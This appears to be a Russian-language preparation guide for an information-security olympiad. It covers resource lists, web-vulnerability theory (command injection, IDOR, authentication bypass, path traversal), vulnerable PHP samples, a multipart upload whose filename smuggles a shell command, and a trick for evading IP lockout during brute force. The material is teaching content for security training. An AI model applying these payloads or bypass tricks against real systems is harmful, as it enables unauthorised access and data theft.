- **Git-репозиторий**: для хранения скриптов, эксплойтов, отчетов

**Структура конспекта**:
```
/nto-preparation
├── /theory
│   ├── web-security.md
│   ├── reverse-engineering.md
│   └── cryptography.md
├── /practice
│   ├── solved-tasks.md
│   └── tools-commands.md
├── /scripts
│   ├── web-exploit.py
│   └── crypto-bruteforce.py
└── /write-ups
    └── vsosh-2022-task3.md
```




### **Теоретические материалы:**
1. **Основы сетей и протоколов**:
   - Компьютерные сети (Таненбаум)
   - TCP/IP Illustrated (Stevens)

2. **Веб-безопасность**:
   - The Web Application Hacker's Handbook
   - OWASP Testing Guide
   - PortSwigger Web Security Academy

3. **Реверс-инжиниринг**:
   - Practical Reverse Engineering
   - The Ghidra Book
   - x86/x64 Assembly Guide

4. **Криптография**:
   - Understanding Cryptography (Paar)
   - Cryptography I (Coursera, Stanford)
   - CryptoHack platform

5. **Digital Forensics**:
   - The Art of Memory Forensics
   - Digital Forensics with Open Source Tools
   - SANS FOR500 Course

### **Практические платформы:**
1. **Для начинающих**:
   - TryHackMe (интерактивные комнаты)
   - CTFlearn (простые задачи)
   - OverTheWire (командная строка, основы)

2. **Для среднего уровня**:
   - Hack The Box (машины разной сложности)
   - VulnHub (виртуальные машины для взлома)
   - PentesterLab (веб-эксплуатация)

3. **Для продвинутых**:
   - CTFtime (расписание и архивы соревнований)
   - pwn.college (реверс и pwn)
   - Root-Me (разнообразные задачи)

### **Сообщества и блоги:**
- Хабр (разделы "Безопасность", "CTF")
- ZeroSec (новости и статьи)
- LiveOverflow (YouTube, разборы задач)
- CTF Write-ups на GitHub
- Reddit: r/securityCTF, r/netsec

### **Инструменты для установки:**
```bash
# Основные инструменты в Kali Linux
sudo apt update
sudo apt install -y \
  burpsuite \
  wireshark \
  ghidra \
  gdb \
  volatility \
  binwalk \
  steghide \
  exiftool \
  nmap \
  gobuster \
  sqlmap \
  john \
  hashcat
```

### **Книги для углубленного изучения:**
1. **Общие**:
   - Hacking: The Art of Exploitation
   - The Hacker Playbook 3

2. **Специализированные**:
   - Black Hat Python
   - Android Security Cookbook
   - IoT Penetration Testing Cookbook

**Удачи в подготовке!** 🚀

*Этот документ является полным самодостаточным курсом подготовки к финалу НТО по профилю «Информационная безопасность». Обновляйте его по мере прохождения материала, добавляйте свои заметки и решения задач.*


Основные понятия
**Атака первичного доступа** **(англ. Initial Access Attack)** — это попытка несанкционированного доступа к системе, сети или приложению, с целью получить начальный уровень доступа и проникнуть в них.  
  
**Уязвимости** — это слабые места в системе или приложении, которые могут быть использованы злоумышленниками для проведения атак.

**Фишинг (Phishing)** — это метод социальной инженерии, при котором злоумышленник пытается получить доступ к чужой информации, обманывая пользователей с помощью поддельных веб-сайтов, электронных писем или сообщений.  
  
**Фишинговый сервис** — это специальный инструмент, который используется для проведения фишинг-атак.

**Отказ в обслуживании ( англ. _denial__-__of__-__service_ _attack (DoS)_ )** — атака на вычислительную систему с целью довести её до отказа, то есть создание таких условий, при которых пользователи системы не смогут получить доступ к предоставляемым системным ресурсам (серверам), либо этот доступ будет затруднён.

**Атака «человек посередине»** **(англ. Man in the middle (MiTM))** — вид атаки в компьютерной безопасности, когда злоумышленник тайно ретранслирует и при необходимости изменяет связь между двумя сторонами, которые считают, что они непосредственно общаются друг с другом.
## Наше положение в сети

Целями для первичных атак зачастую являются **узлы из сети DMZ или из облачной инфраструктуры**, так как именно они опубликованы во внешнюю сеть и подвергаются атакам злоумышленников постоянно, или **машины конечных пользователей, которые атакуются при применении атак с методами социальной инженерии**. 

Именно по причине постоянных атак на них, эти системы зачастую могут быть самым сложным этапом на пути хакера, так как постоянные атаки и инциденты во внешнем периметре вскрывают существующие проблемы, а владельцы устраняют эти проблемы раз за разом.

Главная цель на этом этапе — **попасть в закрытую сеть заказчика** (Internal Network на карте сети)**.**
## Атаки первичного доступа на практике

**Атаки первичного доступа** состоят из техник, которые содержат различные векторы проникновения, чтобы получить доступ и закрепиться в первых скомпрометированных машинах сети.  
  
Техники, используемые для получения первичных точек входа в закрытую часть сети компании, включают **фишинговые атаки** и **использование слабых мест** на публичных сетевых серверах в том числе веб, почтовых, DNS, файловых и пр.  
  
Результаты этапа первичных атак обеспечивают **постоянный доступ к скомпрометированным системам** с привилегированными правами управления. Такими результатами могут быть действующие учетные записи, возможность **управления исполнением** кода или команд в системе, доступ к внесению изменений в системы сети компании.

> Важно понимать, что доступ, полученный в результате первичных атак, может быть потерян достаточно быстро из-за **изменений вносимых в скомпрометированные системы** разработчиками или командой реагирования на инциденты ИБ.

**Популярные примеры атак первичного доступа**

1. Компрометация сетевых сервисов (веб-приложений), возможная в результате ошибок конфигурации или разработки:

2. Компрометация сетевых сервисов через известные уязвимости в используемых версиях ПО.

3. Атаки с применением методов социальной инженерии на персонал компании с целью получения доступа к компьютерам жертв.

4. Переиспользование учетных данных сотрудников компании (почта, домен, облачные сервисы, привилегированные учетные записи), полученных через утечки. ("credential stuffing" – так называется переиспользование утекших учетных данных).

Мы рассмотрим предметно все эти примеры в последующих уровнях.

Основные понятия
**Веб-приложение (Web application****)** —  клиент-серверное приложение, в котором клиент взаимодействует с веб-сервером при помощи браузера. Уязвимости веб-приложений возникают, когда разработчики допускают ошибки в коде. Это может происходить как на этапе разработки, так и на этапе доработки или исправления найденных ранее уязвимостей.  Также при разработке веб-сервиса может использоваться сторонний код, проверка которого требует отдельного внимания разработчиков. Существуют и другие причины небезопасных веб-приложений, некоторые из которых мы коснемся в курсе.  
  
**Идентификация (Identification)**— это процедура определения и подтверждения субъекта идентификации (пользователя) через его идентификатор, однозначно определяющий его на основе предоставленных им данных, таких как: имя, адрес электронной почты или номер телефона. Идентификация часто используется вместе с аутентификацией для подтверждения подлинности пользователя.  
  
**Аутентификация (Authentication)** — это процедура проверки подлинности идентификационных данных пользователя, таких как: логин и пароль. Чтобы убедиться, что он является тем, за кого себя выдает. По сути, процесс проверки конкретного пользователя или клиента путем сравнения введенного им пароля с паролем, сохраненным в базе данных.  
  
**Авторизация (Authorization)** — это процесс проверки прав пользователя на выполнение определенных действий или доступ к определенным ресурсам системы. Пользователь может быть аутентифицирован, но не авторизован на выполнение определенной операции, если у него нет необходимых прав.  
  
**Атака грубой силы (Brute force****)** — это метод криптоанализа, при котором злоумышленник пытается взломать пароль или зашифрованные данные путем перебора возможных комбинаций до тех пор, пока не будет найдено правильное сочетание. Атака грубой силы может быть эффективной, если пароль короткий или используется слабый алгоритм шифрования, однако, при достаточной длине и сложности пароля, такая атака может занять слишком много времени или быть совсем неэффективной.  
  
**Инъекция команд ОС (OS Command Injection****) (также известная как shell инъекция)** — уязвимость веб-приложений, которая позволяет злоумышленнику выполнять произвольные команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, дает возможность полностью скомпрометировать приложение и все его данные.

> Очень часто злоумышленник может использовать уязвимость внедрения команд ОС для компрометации других частей инфраструктуры, используя доверительные отношения для перенаправления атаки на другие системы в организации.

  
**Контроль доступа** **(Access control)**— это процесс управления доступом пользователей к ресурсам системы, включая определение прав доступа и ограничений на использование ресурсов. Контроль доступа обеспечивает безопасность системы, ограничивая доступ пользователей только к необходимым ресурсам и операциям.  
  
**Язык структурированных запросов SQL (Structured Query Language)** – это декларативный язык программирования для хранения и обработки информации в реляционной базе данных. Реляционная база данных хранит информацию в табличной форме со строками и столбцами, представляющими различные атрибуты данных и различные связи между значениями данных. Инструкции SQL можно использовать для хранения, обновления, удаления, поиска и извлечения информации из базы данных. Можно также использовать SQL для поддержания и оптимизации производительности базы данных.  
  
**SQL-инъекция** **(SQL injection)**— это уязвимость веб-приложений, позволяющая злоумышленнику вмешиваться в запросы, которые приложение делает к своей базе данных. Она позволяет злоумышленнику просматривать данные, которые он, как правило, не может получить.  
  
**Обратный путь в каталогах (Path Traversal)** _**(также известный как обход файловых путей)**_ — это уязвимость веб-безопасности, позволяющая злоумышленнику читать произвольные файлы на сервере, на котором запущено приложение. Сюда могут входить разные данные: код приложения, учетные данные для внутренних систем и конфиденциальные файлы операционной системы.

**Расширяемый язык разметки (XML)** позволяет определять и хранить данные совместно используемым способом. XML поддерживает обмен информацией между компьютерными системами, такими, как веб-сайты, базы данных и сторонние приложения. Предопределенные правила упрощают передачу данных в виде XML-файлов по любой сети, поскольку получатель может использовать эти правила для точного и эффективного чтения данных.

  
**Инъекция внешних сущностей XML** (также известная как XXE) — это уязвимость веб-безопасности, позволяющая злоумышленнику вмешиваться в обработку XML-данных приложения. Часто она позволяет злоумышленнику просматривать файлы на файловой системе сервера приложений, а также взаимодействовать с любыми внутренними или внешними системами, к которым имеет доступ само приложение.  
  
В большом числе случаев злоумышленник может усилить атаку XXE для компрометации основного сервера или другой внутренней инфраструктуры, используя уязвимость XXE для выполнения атак на _подделку запроса на стороне сервера (SSRF)_.  
  
**Межсайтовый скриптинг** _(также известный как XSS)_ — это уязвимость веб-безопасности, позволяющая злоумышленнику компрометировать взаимодействие пользователей с уязвимым приложением. Она позволяет злоумышленнику обходить политику одного источника (Same Origin Policy (SOP)), которая предназначена для разделения различных веб сайтов друг от друга.
## **Наше положение в сети**

Веб-серверы являются одной из наиболее важных частей любой ИТ-инфраструктуры, так как они отвечают за обслуживание запросов клиентов и доставку содержимого. По этой причине веб-серверы часто являются первичной целью атаки для злоумышленников.

Если злоумышленники смогут получить доступ к веб-серверу, они могут использовать его для распространения вредоносных программ, кражи данных, установки бэкдоров и выполнения других вредоносных операций.

Поэтому необходимо обеспечить надежную защиту веб-серверов и регулярно проверять их на наличие уязвимостей.
## Категории типовых уязвимостей

Типовые уязвимости сгруппированы как по _механизмам_, где они происходят, так и по _характеру их эксплуатации._ А также по _технологиям_, в которых они обнаруживаются.  
  
**Типовые уязвимости по механизмам, где они происходят**:

- Уязвимости механизмов аутентификации (Authentication Bypass)
- Уязвимости механизмов авторизации (Vulnerabilities of authorization )
- Уязвимости загрузки файлов (File upload vulnerabilities)
- Уязвимости раскрытия информации ( Coordinated Vulnerability Disclosure)
- Уязвимости в системах криптографии (Vulnerabilities in cryptography systems) и др.

**Типовые уязвимости по характеру их эксплуатации:**

- Уязвимости состояния гонки (race condition)
- Уязвимости некорректной нейтрализации управляющих конструкций при генерации веб-страниц (атаки межсайтового скриптинга) (XSS)
- Уязвимости подделки запроса со стороны сервера (SSRF)
- Уязвимости подделки запроса со стороны клиента (CSRF) и др.

**Типовые уязвимости по технологиям, в которых они происходят:**

- Уязвимости SQL инъекций (SQL injection)
- Уязвимости внедрения внешних сущностей в XML-документы (XXE )
- Уязвимости инъекций в ORM-запросах (ORM injection)
- Уязвимости инъекций в LDAP-запросах (LDAP Injection)
- Уязвимости инъекции команд или аргументов в запросах к терминальной оболочке ОС (Command Injection)

> Категоризировать уязвимости можно по-разному. Важно то, что появляются все новые классы уязвимостей и атак вместе с ростом технологий и их применением в различных ситуациях. Обладая знанием типовых уязвимостей веб-приложений, можно эффективно искать и эксплуатировать возможности, предоставляемые приложением, для достижения целей проверки.

Мы рассмотрим несколько уязвимостей, возникающих на начальных этапах поиска возможностей компрометации веб-приложения и на заключительных этапах, когда полная компрометация приложения становится возможной.  
  
На начальных этапах мы сталкиваемся с механизмами **аутентификации** и **контроля доступа**.  
  
На заключительных этапах самым большим достижением в _демонстрации возможности компрометации_ является демонстрация возможности выполнить **произвольный код** или **команды** ОС от имени веб-приложения.


Уязвимости инъекции команд ОС
Инъекция команд ОС (также известная как shell инъекция) является уязвимостью веб-приложений, которая позволяет злоумышленнику выполнять произвольные команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, дает возможность полностью скомпрометировать приложение и все его данные. Очень часто злоумышленник может использовать уязвимость внедрения команд ОС для компрометации других частей инфраструктуры, используя доверительные отношения для перенаправления атаки на другие системы в организации.

## **Как возникают уязвимости инъекции команд?**

Пример допущенной **уязвимости** инъекции команд:

```sql
$command = 'convert -pointsize 72 label:Hello ' . $_FILES['userfile']['name'];
 system($command);
```

В примере выше имя файла попадает прямо в строку исполнения, которая в последствии будет выполнена терминальной оболочкой. Это позволяет дописать дополнительные команды терминальной оболочки и воспользоваться этим недостатком.

Пример **эксплуатации** для уязвимости выше:

```sql
------WebKitFormBoundaryePkpFF7tjBAqx29L
Content-Disposition: form-data; name="userfile"; filename="check | ls -la;"
Content-Type: application/x-object

... contents of file goes here ...
```

Зачастую эксплуатация подобного рода уязвимостей затруднена и требует поиска возможностей выполнения кода через другие “контексты” и технологии.

Например, выполнение команд возможно в ряде других уязвимостей, которые, прежде чем получить возможность выполнить произвольную команду, надо найти и проэксплуатировать.

#### **К подобным уязвимостям относятся:**

- Уязвимости небезопасной десериализации
- Уязвимости внедрения шаблонов на стороне сервера SSTI
- Уязвимости SQL инъекции
- Уязвимости переполнения буфера / кучи / стека
- Множественные случаи проблем и ошибок реализации, возникающих при работе с запуском процессов и работе с терминальной оболочкой

https://portswigger.net/web-security/os-command-injection/lab-simple

Уязвимости контроля доступа
**Что такое контроль доступа?**

В контексте веб-приложений контроль доступа зависит от аутентификации и управления сеансами:

- Аутентификация идентифицирует пользователя и подтверждает, что он является тем, за кого себя выдает.
- Управление сеансом идентифицирует, какие последующие HTTP-запросы выполняются тем же самым пользователем.
- Управление доступом определяет, разрешено ли пользователю выполнять действия, которые он пытается выполнить.

_**Сломанный контроль доступа**_ является часто встречающейся и часто критической уязвимостью безопасности. Проектирование и управление контролем доступа — это сложная и динамичная проблема, которая применяет деловые, организационные и правовые ограничения к технической реализации. Проектные решения по контролю доступа должны приниматься людьми, а не технологиями, и вероятность ошибок высока.

## Пример техники

В качестве примера вы можете создать заказ на сайте лабораторного стенда. После создания заказа вы будете перенаправлены на страницу с информацией о нем. Адрес этой станицы будет вида `http://localhost:1337/receipt.php?orderID=**3**`, где 3 — это номер вашего заказа.  
  
Вы можете попробовать нарушить контроль доступа и обратиться к заказам с другими номерами. Если система уязвима — вы увидите данные о заказе который не принадлежит вам, и там отображаются персональные данные другого пользователя.

> - Обычно номера заказов идут по возрастающей, следовательно, скорее всего, есть заказы с номером меньше вашего, но нет с номером больше вашего.
> - При запуске сайта первые заказы обычно создают для теста владельцы сайта и если эти заказы не были удалены, то там могут оказаться контактные данные администратора сайта.

Таким образом, вы получите доступ к данным, которые вам не предназначались, и **обнаружите уязвимость контроля доступа в лабораторном стенде.**

## Категории контроля доступа

С точки зрения пользователя, **_контроль доступа_** можно разделить на следующие категории:

- Вертикальный контроль доступа.
- Горизонтальный контроль доступа.
- Контекстно-зависимый контроль доступа.

#### **Вертикальный контроль доступа**

**Вертикальный контроль доступа** — это механизмы, ограничивающие доступ к чувствительным функциям, недоступным другим типам пользователей. С помощью вертикальных средств контроля доступа различные типы пользователей имеют доступ к различным функциям приложений. Например, администратор может изменить или удалить учетную запись любого пользователя, в то время как обычный пользователь не имеет доступа к этим действиям. **_Вертикальные средства контроля доступа_** могут быть более тонкой реализацией моделей безопасности, разработанных для внедрения бизнес-политик, таких, как разделение обязанностей и наименьших привилегий.

#### **Пример уязвимостей IFLAC**

**Insecure Function Level Access Control (IFLAC)** — это подкатегория уязвимостей контроля доступа. **_Уязвимый контроль доступа функционального уровня_** может позволить злоумышленникам получить доступ к несанкционированным для роли злоумышленника функциям. Административные функции являются основной целью данного типа атак.

Данная уязвимость возникает, когда приложение публикует функциональный интерфейс (например, API), в котором не проверяется уровень доступа для обращения к определенным в интерфейсе функциям. В таком случае злоумышленник может вызывать функции приложения, которые дают ему привилегии, незадуманные для использования уровнем роли злоумышленника.

Примером может послужить возможность обращения к вызову функции удаления пользователя, в то время как доступ в административную панель для _низкопривилегированного пользователя_ формально закрыт. Т.е. пользователь не может открыть кабинет администратора, но может выполнить запрос к методу API, который будет успешно выполнен.

## **Горизонтальный контроль доступа**

**_Горизонтальный контроль доступа_** — это механизмы, ограничивающие доступ к ресурсам для пользователей, которым специально разрешен доступ к этим ресурсам.  
  
С помощью горизонтального контроля доступа различные пользователи имеют доступ к подмножеству ресурсов одного и того же типа. Например, банковское приложение позволит пользователю просматривать транзакции и осуществлять платежи со своих счетов, но не со счетов любого другого пользователя.

#### **Пример уязвимостей IDOR**

**_Небезопасные прямые ссылки на объекты (IDOR)_** — это также подкатегория уязвимостей контроля доступа. IDOR возникает, когда приложение использует пользовательский ввод для прямого доступа к объектам, а злоумышленник может модифицировать ввод для получения несанкционированного доступа. Он был популярен своим появлением в OWASP TOP 10 2007. Хотя, это лишь один из примеров многих ошибок в реализации, которые могут привести к обходу контроля доступа.

Рассмотрим сайт, который использует следующий URL для доступа к странице учетной записи клиента, извлекая информацию из внутренней базы данных:  
`https://insecure-website.com/customer_account?customer_number=132355`

Здесь номер клиента используется непосредственно как индекс записи в запросах, которые выполняются на внутренней базе данных. Если другие элементы управления отсутствуют, злоумышленник может просто изменить значение параметра _customer_number_, минуя элементы управления доступом для просмотра записей других клиентов. Это пример уязвимости IDOR, приводящей к горизонтальному повышению привилегий.  
  
Атакующий может выполнить горизонтальное и вертикальное повышение привилегий, изменяя пользователя на пользователя с дополнительными привилегиями в обход элементов управления доступом. Другие возможности включают в себя, например, использование утечки пароля или изменение параметров после того, как злоумышленник попал на страницу учетной записи пользователя.

## **Контроль доступа в местах, зависящих от бизнес-логики**

_**Контекстно-зависимые элементы управления доступом**_ ограничивают доступ к функциональности и ресурсам в зависимости от состояния приложения или взаимодействия с ним пользователя, а также препятствуют выполнению пользователем действий в неправильном порядке. Например, веб-сайт розничной торговли может помешать пользователю изменить содержимое корзины после того, как он произвел оплату.

#### **Как исключать возникновение уязвимостей контроля доступа?**

Уязвимости контроля доступа, как правило, можно предотвратить, применяя глубокий подход к защите и следуя следующим принципам:

- Никогда не полагайтесь только на обфускацию для контроля доступа.
- Если ресурс не предназначен для публичного доступа, запретите доступ по умолчанию.
- Везде, где это возможно, используйте единый прикладной механизм для обеспечения контроля доступа.
- На уровне кода сделайте обязательным для разработчиков объявление доступа, разрешенного для каждого ресурса, и запретите доступ по умолчанию.
- Тщательно проверяйте и тестируйте средства контроля доступа, чтобы убедиться, что они работают так, как задумано.
- Регистрируйте сбои контроля доступа и уведомляйте администраторов при необходимости (например, если сбои повторяются).
- Ограничивайте частоту доступа к API и контроллерам для минимизации ущерба от инструментов автоматизации атак.

## **Материалы для самостоятельного изучения**

- Вертикальный контроль доступа:
    - Пример: "http://web.site/admin/deleteUser?username=jack"
        
    - Примеры с [HackerOne](https://hackerone.com/reports/502593)
        
- Горизонтальный контроль доступа:
    - **_Примеры с HackerOne:_**
        - [IDOR в DoD](https://hackerone.com/reports/1004745)
        - [IDOR в магазине](https://hackerone.com/reports/287789)




Уязвимости обхода аутентификации
## **Аутентификация, авторизация и идентификация**

**​​**Существуют такие механизмы управления и защиты информации, как **идентификация**, **авторизация и аутентификация**.

- Идентификация — процедура, в результате выполнения которой для субъекта идентификации присваивается его идентификатор, однозначно определяющий этого субъекта в информационной системе.
- Аутентификация — процедура проверки подлинности, например проверка подлинности пользователя путем сравнения введенного им пароля с паролем, сохраненным в базе данных. Подтверждает, что он является тем, за кого себя выдает. 
- Авторизация — предоставление определенному лицу или группе лиц прав на выполнение определенных действий. Эта процедура проверяет есть ли права у пользователя на исполнение запрашиваемых им операций.
- Многофакторная аутентификация — это аутентификация, при выполнении которой используется не менее двух различных факторов аутентификации.
- **OTP (One-Time Password)** — это способ аутентификации, при котором пользователь получает пароль, доступный только для одного сеанса входа или одной транзакции в информационной системе или приложении. В основу OTP заложен принцип, что генерируемый пароль действителен для одной сессии.

#### **Классифицировать различные типы проверки подлинности можно по трем факторам:**

- **Знание**, например, пароль или ответ на вопрос безопасности, одноразовый код. Их иногда называют _факторами знаний._
- **Обладание**, то есть физический объект, такой как мобильный телефон или маркер безопасности - магнитная карта. Их иногда называют _факторами владения_.
- **Биометрия**, например, персональные данные или модели поведения - конфиденциальная информация. Их иногда называют _факторами согласованности_.

Механизмы аутентификации полагаются на целый ряд технологий для проверки одного или нескольких из этих факторов.

Рассмотрим следующую технику, в которой реализуются атаки на механизмы аутентификации, и разберем действия хакера по шагам.

## **Уязвимости в механизмах аутентификации**

Система аутентификации веб-сайта, как правило, состоит из нескольких различных механизмов, в которых могут возникать уязвимости. Некоторые уязвимости широко применимы во всех этих контекстах, в то время как другие более специфичны с точки зрения предоставляемой функциональности.  
  
Рассмотрим более подробно некоторые из наиболее распространенных уязвимостей в следующих областях:

- Уязвимости при входе на основе пароля
- Уязвимости при многофакторной аутентификации
- Уязвимости в других механизмах аутентификации

#### **Уязвимости в Password-based аутентификации**

Для веб-сайтов, использующих процесс входа на основе пароля, пользователи либо сами регистрируются для получения учетной записи, либо администратор присваивает им учетную запись. Эта учетная запись связана с уникальным именем пользователя и секретным паролем, который пользователь вводит в форме входа для аутентификации.  
  
В этом сценарии сам факт знания секретного пароля воспринимается как достаточное доказательство личности пользователя. Следовательно, безопасность сайта будет скомпрометирована, если злоумышленник сможет либо получить, либо угадать учетные данные другого пользователя.

Уязвимости в этом механизме возникают по различным причинам, одни из них:

- Возможные brute-force атаки
- Уязвимая защита от brute-force атак
- HTTP-basic аутентификация
## **Brute-force атаки**

#### **Brute-forcing пользовательских имен**

Имена пользователей особенно легко угадать, если они соответствуют **узнаваемому шаблону**, например, адресу электронной почты. Очень часто можно увидеть логины в формате:

**_firstname.lastname@somecompany.com_**

Однако, даже если нет очевидного шаблона, иногда даже высокопривилегированные учетные записи создаются с использованием предсказуемых имен пользователей, таких как **_admin_** или **_administrator_**.

#### **Brute-forcing паролей**

Пароли могут быть перебраны аналогичным образом в зависимости от сложности пароля. Многие сайты принимают ту или иную форму политики паролей, которая заставляет пользователей создавать пароли с высокой энтропией, которые, по крайней мере, теоритически сложнее взломать одним перебором. Обычно это включает в себя принудительное использование в паролях:

- Минимального количества символов
- Смеси строчных и заглавных букв
- Как минимум одного специального символа

Однако, несмотря на то, что **высокоэнтропийные пароли** сложно взломать компьютеру, мы можем использовать базовые знания о человеческом поведении для эксплуатации уязвимостей, которые пользователи невольно привносят в эту систему.  
  
Вместо того, чтобы создавать надежный пароль со случайной комбинацией символов, пользователи часто берут пароль, который они могут запомнить, и пытаются использовать его в соответствие с политикой паролей. Например, если не разрешено использование **_password_**, пользователи могут попробовать что-нибудь вроде _**P@ssw0rd**_ или _**P4$$w0rd!**_.  
  
Такое знание предсказуемых закономерностей означает, что атаки с применением грубой силы часто могут быть гораздо более изощренными и, следовательно, более эффективными, чем простые итерации через всевозможные комбинации символов.

**Уязвимая защита от brute-force атак**

Для успешной компроментации аккаунта, злоумышленнику необходимо провести множество неудачных попыток. Таким образом защита от брут-форс атак строится на замедлении скорости автоматизированных попыток перебора пароля.

Двумя **наиболее распространенными** способами предотвращения атак полным перебором являются следующие:

1. Блокировка **учетной записи**, к которой удаленный пользователь пытается получить доступ, если он совершает слишком много неудачных попыток входа.
2. Блокировка **IP-адреса** удаленного пользователя, если он делает слишком много попыток входа в систему.

> Оба подхода предлагают разную степень защиты, но ни один из них _не является **неуязвимым**_, особенно если он реализуется с использованием ошибочной логики.

Иногда вы можете обнаружить, что ваш IP заблокирован, если вы не можете войти слишком много раз. В некоторых реализациях счетчик количества неудачных попыток сбрасывается при успешном входе владельца IP-адреса. Это означает, что злоумышленнику просто придется входить в систему под своей учетной записью каждые несколько попыток, чтобы этот лимит никогда не был достигнут.

В этом случае достаточно просто включать свои собственные учетные данные для входа в систему через регулярные интервалы времени в течение перебора всего словаря, чтобы сделать эту защиту практически бесполезной.

##Basic-аутентификация HTTP

## **Basic-аутентификация HTTP**

Несмотря на то, что эта аутентификация достаточно старая, ее относительная простота и легкость реализации ведет к тому, что можно достаточно часто видеть использование базовой аутентификации по HTTP.  
  
**При базовой HTTP-аутентификации** клиент получает от сервера **_маркер аутентификации_,** который строится путем сцепления имени пользователя и пароля, а также их кодировки в **_Base64_**. Этот токен хранится и управляется браузером, который автоматически добавляет его в заголовок авторизации каждого последующего запроса следующим образом:

```sql
Authorization: Basic base64(username:password)
```

> _По ряду причин это, как правило, не считается безопасным методом аутентификации_.

Во-первых, он включает в себя многократную отправку учетных данных пользователя при каждом запросе. Если на веб-сайте также не реализована **HSTS**, учетные данные пользователя могут быть перехвачены в ходе _атаки типа **Man-in-the-Middle** (человек посередине)_.

Кроме того, реализация базовой аутентификации **HTTP** часто не поддерживает защиту от переборов грубой силы. Поскольку токен состоит исключительно из статических значений, это может сделать его уязвимым для перебора.

Базовая аутентификация **HTTP** также особенно уязвима к атакам, связанным с сеансом, в частности к **CSRF**, от которых она сама по себе не обеспечивает никакой защиты.

В некоторых случаях использование уязвимой базовой **HTTP**-аутентификации может дать злоумышленнику доступ только к, казалось бы, неинтересной странице. Однако, в дополнение к обеспечению дополнительной поверхности атаки, учетные данные, раскрытые таким образом, могут быть повторно использованы в других, более конфиденциальных контекстах.

#### **Уязвимости мультифакторной аутентификации**

Многие веб-сайты полагаются исключительно на однофакторную аутентификацию с использованием пароля для аутентификации пользователей. Однако некоторые требуют от пользователей подтверждения их личности с помощью нескольких факторов аутентификации.

Проверка биометрических факторов является непрактичной для большинства веб сайтов. Однако все чаще встречается обязательная и **необязательная двухфакторная аутентификация (2FA**), основанная на том, _что_ вы знаете и что у вас есть_._ Это  
обычно требует от пользователей ввода как традиционного пароля, так и временного верификационного кода со стороннего физического устройства, находящегося у них в распоряжении.

Хотя иногда злоумышленник может получить один фактор, основанный на знаниях, например, пароль, **вероятность одновременного получения другого фактора из стороннего источника значительно ниже.** По этой причине двухфакторная аутентификация явно более безопасна, чем однофакторная. Однако, как и любая другая мера безопасности, она безопасна настолько, насколько и ее реализация. Плохо реализованную двухфакторную аутентификацию можно обойти частично или даже полностью, точно так же, как и однофакторную аутентификацию.

> Следует также отметить, что _все преимущества многофакторной аутентификации достигаются только путем проверки множества различных факторов_. **Проверка одного и того же фактора двумя разными способами не является истинной двухфакторной аутентификацией.**
> 
> Одним из таких примеров является 2FA через электронную почту. Хотя пользователь должен предоставить пароль и проверочный код, доступ к коду предполагается на основе того, что пользователь знает учетные данные для входа в свою учетную запись электронной почты. Поэтому фактор проверки подлинности знания просто проверяется дважды.

**Обход двухфакторной аутентификации возможен по разным причинам:**

1. Иногда **реализация двухфакторной аутентификации** бывает настолько несовершенной, что ее можно обойти полностью.
2. Иногда **ошибочная логика двухфакторной аутентификации** означает, что после того, как пользователь выполнил начальный шаг входа в систему, веб-сайт не может адекватно проверить, что этот же пользователь выполняет второй шаг.
3. А также, как и в случае с паролями, веб-сайты должны принимать меры по предотвращению **перебора проверочного кода 2FA**. Это особенно важно, потому что код часто представляет собой простое 4-х или 6-значное число. Без адекватной защиты взлом такого кода тривиален.

#### **Уязвимости механизмов смены пароля, восстановления пароля, поддержания сессии**

В дополнение к базовой функциональности входа в систему, большинство сайтов предоставляют дополнительные функциональные возможности, позволяющие пользователям управлять своей учетной записью. Например, пользователи обычно могут изменить свой пароль или сбросить его, когда они его забудут. Эти механизмы также могут добавлять уязвимости, которые могут быть использованы злоумышленником.

> Веб-сайты, как правило, стараются избежать известных уязвимостей на своих страницах входа. Однако легко упустить из виду тот факт, что необходимо предпринять аналогичные шаги, чтобы убедиться в том, что связанная с ними функциональность не менее надежна. Это особенно важно в тех случаях, когда злоумышленник может создать свою учетную запись и, следовательно, имеет легкий доступ к изучению этих дополнительных страниц.

Сторонние **механизмы аутентификации**, которые также могут быть уязвимы:

- Механизм поддержания сессии «запомнить меня»
- Механизм сброса пароля через **E-mail**
- Механизм сброса пароля с использованием **URL** и одноразового токена
- Механизм смены пароля

**Материалы для самостоятельного изучения**

- [Серия нерегулярного подкаста](https://t.me/cybersec_in_russian/5) с обсуждением основных атак на аутентификацию и угон аккаунтов
- [OWASP-памятка](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md) по реализации механизмов аутентификации

Тренироваться на упражнениях можно на открытых платформах. Одна из лучших платформ по изучению проблем безопасности веб-приложений: [PortSwigger Academy](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses).

- [Попрактикуемся](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses) в атаках на аутентификацию

Типичные ошибки в [BurpSuite](https://portswigger.net/burp/documentation/scanner/burp-scanner-error-reference)

Так же настоятельно рекомендуем ознакомится с различными инструментами, используемыми для брутфорсинга (hydra, medusa, patator и др.):

- [https://www.kali.org/tools/hydra/](https://www.kali.org/tools/hydra/)
- [https://www.kali.org/tools/medusa/](https://www.kali.org/tools/medusa/)
- [https://www.kali.org/tools/patator/](https://www.kali.org/tools/patator/)


Уязвимости разграничения доступа к каталогам

Обход файловых путей (англ. **Path Traversal** или **Directory Traversal**) – это уязвимость веб-безопасности, позволяющая злоумышленнику читать произвольные файлы на сервере, на котором запущено приложение. Сюда могут входить код приложения и данные, учетные данные для внутренних систем и конфиденциальные файлы операционной системы. В некоторых случаях злоумышленник может записать в произвольные файлы на сервере, что позволит ему изменить данные или поведение приложения, и, в конечном счете, получить полный контроль над сервером.

### **Почему такие уязвимости появляются?**

Уязвимости Directory Traversal появляются из-за _отсутствия валидации входных данных пользователя_, а также из-за _отсутствия разграничения доступа приложения_ или функции на возможность обращаться к файловым ресурсам всего сервера.

**Пример уязвимого кода:**

`<?php   $template = 'red.php';   if (isset($_COOKIE['TEMPLATE'])) {       $template = $_COOKIE['TEMPLATE'];   }   include "/home/users/phpguru/templates/" . $template;`

